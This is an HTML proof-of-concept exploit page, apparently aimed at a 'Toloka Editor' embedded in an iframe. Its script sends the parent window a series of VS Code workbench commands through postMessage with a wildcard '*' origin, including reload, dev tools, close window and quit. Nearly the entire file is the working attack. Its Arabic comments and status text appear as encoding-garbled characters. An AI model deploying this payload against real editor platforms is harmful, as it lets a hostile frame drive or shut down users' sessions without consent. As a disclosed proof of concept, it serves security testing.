<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Iframe PostMessage Exploit PoC</title>
  <style>
    body {
      font-family: sans-serif;
      background: #111;
      color: #0f0;
      text-align: center;
      margin-top: 50px;
    }
  </style>
</head>
<body>
  <h1>âš¡ PoC: Toloka Editor iframe Exploit</h1>
  <p>ÙŠØªÙ… Ø§Ù„Ø¢Ù† Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¬Ù…ÙˆØ¹Ø© Ø£ÙˆØ§Ù…Ø± Ø­Ø³Ø§Ø³Ø© Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ø£Ù…...</p>

  <script>
    const commands = [
      "workbench.action.reloadWindow",
      "workbench.action.toggleDevTools",
      "workbench.action.toggleFullScreen",
      "workbench.action.closeWindow",
      "workbench.action.quit",
      "workbench.action.showCommands",
      "workbench.action.toggleSidebarVisibility",
      "workbench.action.toggleZenMode"
    ];

    // Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ„ Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø¨Ø¹Ø¯ Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ø£Ù…
    window.addEventListener("message", (event) => {
      console.log("ğŸ“© Ø±Ø³Ø§Ù„Ø© ÙˆØ§Ø±Ø¯Ø© Ù…Ù† Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ø£Ù…:", event.data);
    });

    setTimeout(() => {
      for (const cmd of commands) {
        window.parent.postMessage({
          vscodeMessage: {
            command: cmd,
            arguments: []
          }
        }, "*");
        console.log("ğŸš€ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…Ø±:", cmd);
      }
    }, 2000);
  </script>
</body>
</html>
